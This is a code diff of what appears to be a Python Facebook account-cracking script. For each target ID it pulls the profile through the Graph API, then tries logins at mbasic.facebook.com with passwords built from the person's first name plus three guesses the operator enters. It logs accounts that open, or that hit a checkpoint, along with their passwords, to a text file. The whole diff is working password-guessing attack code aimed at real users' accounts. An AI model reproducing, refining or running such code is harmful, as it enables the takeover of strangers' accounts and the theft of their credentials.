@@ -240,9 +240,9 @@ def pilih_passxd():
 		passchoice()
 	
         print "   [•] Total ID       : "+str(len(id))
-	pass1 = raw_input ("   [•] Pass 1 : ")
-	pass2 = raw_input ("   [•] Pass 2 : ")
-	pass3 = raw_input ("   [•] Pass 3 : ")
+	pass4 = raw_input ("   [•] Password 1     : ")
+	pass5 = raw_input ("   [•] Password 2     : ")
+	pass6 = raw_input ("   [•] Password 3     : ")
     	print ("   [•] Crack Started...\n")
 	
 	def main(arg):
@@ -255,103 +255,102 @@ def pilih_passxd():
 		try:
 			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 			b = json.loads(a.text)
-                        bt = b['birthday']
+			pass1 = b['first_name'].lower()+'123'
 			rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : user, "pass" : pass1, "login" : "submit"}, headers = { "user-agent" : "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"})
 			xo = rex.content
 			if 'mbasic_logout_button' in xo or 'save-device' in xo:
-				print '\033[1;97m   [OK]\033[1;97m '+user+' \033[1;97m| \033[1;97m'+pass1+' | '+bt
+				print '\033[1;97m   [OK]\033[1;97m '+user+' \033[1;97m| \033[1;97m'+pass1
 				oke = open('done/Indo.txt', 'a')
-				oke.write('\n[OK] '+user+' | '+pass1+' | '+bt)
+				oke.write('\n[OK] '+user+' | '+pass1)
 				oke.close()
 				oks.append(user+pass1)
 			else :
 				if 'checkpoint' in xo:
-					print '\033[1;97m   [CP]\033[1;97m '+user+' \033[1;97m|\033[1;97m '+pass1+' | '+bt
+					print '\033[1;97m   [CP]\033[1;97m '+user+' \033[1;97m|\033[1;97m '+pass1
 					cek = open('done/Indo.txt', 'a')
-					cek.write('\n[CP] '+user+' | '+pass1+' | '+bt)
+					cek.write('\n[CP] '+user+' | '+pass1)
 					cek.close()
 					cekpoint.append(user+pass1)
 				else:
+					pass2 = b['first_name'].lower()+'12345'
 					rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : user, "pass" : pass2, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"})
 					xo = rex.content
 					if 'mbasic_logout_button' in xo or 'save-device' in xo:
-						print '\033[1;97m   [OK]\033[1;97m '+user+' \033[1;97m| \033[1;97m'+pass2+' | '+bt
+						print '\033[1;97m   [OK]\033[1;97m '+user+' \033[1;97m| \033[1;97m'+pass2
 						oke = open('done/Indo.txt', 'a')
-						oke.write('\n[OK] '+user+' | '+pass2+' | '+bt)
+						oke.write('\n[OK] '+user+' | '+pass2)
 						oke.close()
 						oks.append(user+pass2)
 					else:
 						if 'checkpoint' in xo:
-							print '\033[1;97m   [CP]\033[1;97m '+user+' \033[1;97m|\033[1;97m '+pass2+' | '+bt
+							print '\033[1;97m   [CP]\033[1;97m '+user+' \033[1;97m|\033[1;97m '+pass2
 							cek = open('done/Indo.txt', 'a')
-							cek.write('\n[CP] '+user+' | '+pass2+' | '+bt)
+							cek.write('\n[CP] '+user+' | '+pass2)
 							cek.close()
 							cekpoint.append(user+pass2)
                         			else:
+							pass3 = b['first_name'].lower()
                             				rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : user, "pass" : pass3, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"})
                             				xo = rex.content
                             				if 'mbasic_logout_button' in xo or 'save-device' in xo:
-                                				print '\033[1;97m   [OK]\033[1;97m '+user+' \033[1;97m| \033[1;97m'+pass3+' | '+bt
+                                				print '\033[1;97m   [OK]\033[1;97m '+user+' \033[1;97m| \033[1;97m'+pass3
                                 				oke = open('done/Indo.txt', 'a')
-                                				oke.write('\n[OK] '+user+' | '+pass3+' | '+bt)
+                                				oke.write('\n[OK] '+user+' | '+pass3)
                                 				oke.close()
                                 				oks.append(user+pass3)
                             				else:
                                 				if 'checkpoint' in xo:
-                                    					print '\033[1;97m   [CP]\033[1;97m '+user+' \033[1;97m|\033[1;97m '+pass3+' | '+bt
+                                    					print '\033[1;97m   [CP]\033[1;97m '+user+' \033[1;97m|\033[1;97m '+pass3
                                     					cek = open('done/Indo.txt', 'a')
-                                    					cek.write('\n[CP] '+user+' | '+pass3+' | '+bt)
+                                    					cek.write('\n[CP] '+user+' | '+pass3)
                                     					cek.close()
                                     					cekpoint.append(user+pass3)
                                 				else:
-                                    					pass4 = b['first_name'].lower()+'123'
                                     					rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : user, "pass" : pass4, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"})
                                     					xo = rex.content
                                     					if 'mbasic_logout_button' in xo or 'save-device' in xo:
-                                        					print '\033[1;97m   [OK]\033[1;97m '+user+' \033[1;97m| \033[1;97m'+pass4+' | '+bt
+                                        					print '\033[1;97m   [OK]\033[1;97m '+user+' \033[1;97m| \033[1;97m'+pass4
                                         					oke = open('done/Indo.txt', 'a')
-										oke.write('\n[OK] '+user+' | '+pass4+' | '+bt)
+										oke.write('\n[OK] '+user+' | '+pass4)
                                         					oke.close()
                                         					oks.append(user+pass4)
                                     					else:
                                         					if 'checkpoint' in xo:
-                                            						print '\033[1;97m   [CP]\033[1;97m '+user+' \033[1;97m|\033[1;97m '+pass4+' | '+bt
+                                            						print '\033[1;97m   [CP]\033[1;97m '+user+' \033[1;97m|\033[1;97m '+pass4
                                             						cek = open('done/Indo.txt', 'a')
-                                            						cek.write('\n[CP] '+user+' | '+pass4+' | '+bt)
+                                            						cek.write('\n[CP] '+user+' | '+pass4)
                                             						cek.close()
                                             						cekpoint.append(user+pass4)
                                         					else:
-                                            						pass5 = b['first_name'].lower()+'12345'
                                             						rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : user, "pass" : pass5, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"})
                                             						xo = rex.content
                                             						if 'mbasic_logout_button' in xo or 'save-device' in xo:
-                                               						 	print '\033[1;97m   [OK]\033[1;97m '+user+' \033[1;97m| \033[1;97m'+pass5+' | '+bt
+                                               						 	print '\033[1;97m   [OK]\033[1;97m '+user+' \033[1;97m| \033[1;97m'+pass5
                                                 						oke = open('done/Indo.txt', 'a')
-                                                						oke.write('\n[OK] '+user+' | '+pass5+' | '+bt)
+                                                						oke.write('\n[OK] '+user+' | '+pass5)
                                                 						oke.close()
                                                 						oks.append(user+pass5)
                                             						else:
                                                 						if 'checkpoint' in xo:
-                                                    							print '\033[1;97m   [CP]\033[1;97m '+user+' \033[1;97m|\033[1;97m '+pass5+' | '+bt
+                                                    							print '\033[1;97m   [CP]\033[1;97m '+user+' \033[1;97m|\033[1;97m '+pass5
                                                     							cek = open('done/Indo.txt', 'a')
-                                                    							cek.write('\n[CP] '+user+' | '+pass5+' | '+bt)
+                                                    							cek.write('\n[CP] '+user+' | '+pass5)
                                                     							cek.close()
                                                     							cekpoint.append(user+pass5)
 												else:
-                                            								pass6 = b['first_name'].lower()
                                             								rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : user, "pass" : pass6, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"})
                                             								xo = rex.content
                                             								if 'mbasic_logout_button' in xo or 'save-device' in xo:
-                                               						 			print '\033[1;97m   [OK]\033[1;97m '+user+' \033[1;97m| \033[1;97m'+pass6+' | '+bt
+                                               						 			print '\033[1;97m   [OK]\033[1;97m '+user+' \033[1;97m| \033[1;97m'+pass6
                                                 								oke = open('done/Indo.txt', 'a')
-                                                								oke.write('\n[OK] '+user+' | '+pass6+' | '+bt)
+                                                								oke.write('\n[OK] '+user+' | '+pass6)
                                                 								oke.close()
                                                 								oks.append(user+pass6)
                                             								else:
                                                 								if 'checkpoint' in xo:
-                                                    									print '\033[1;97m   [CP]\033[1;97m '+user+' \033[1;97m|\033[1;97m '+pass6+' | '+bt
+                                                    									print '\033[1;97m   [CP]\033[1;97m '+user+' \033[1;97m|\033[1;97m '+pass6
                                                     									cek = open('done/Indo.txt', 'a')
-                                                    									cek.write('\n[CP] '+user+' | '+pass6+' | '+bt)
+                                                    									cek.write('\n[CP] '+user+' | '+pass6)
                                                     									cek.close()
                                                     									cekpoint.append(user+pass6)
 								
